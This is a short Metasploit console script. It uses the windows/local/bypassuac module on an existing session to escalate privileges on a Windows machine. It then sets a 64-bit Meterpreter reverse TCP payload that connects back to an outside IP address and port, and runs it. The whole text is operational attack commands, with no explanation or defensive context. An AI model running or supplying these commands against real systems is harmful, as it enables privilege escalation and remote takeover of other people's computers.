use exploit/windows/local/bypassuac
set SESSION 1
set TARGET 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 35.203.91.52
set LPORT 31338
exploit
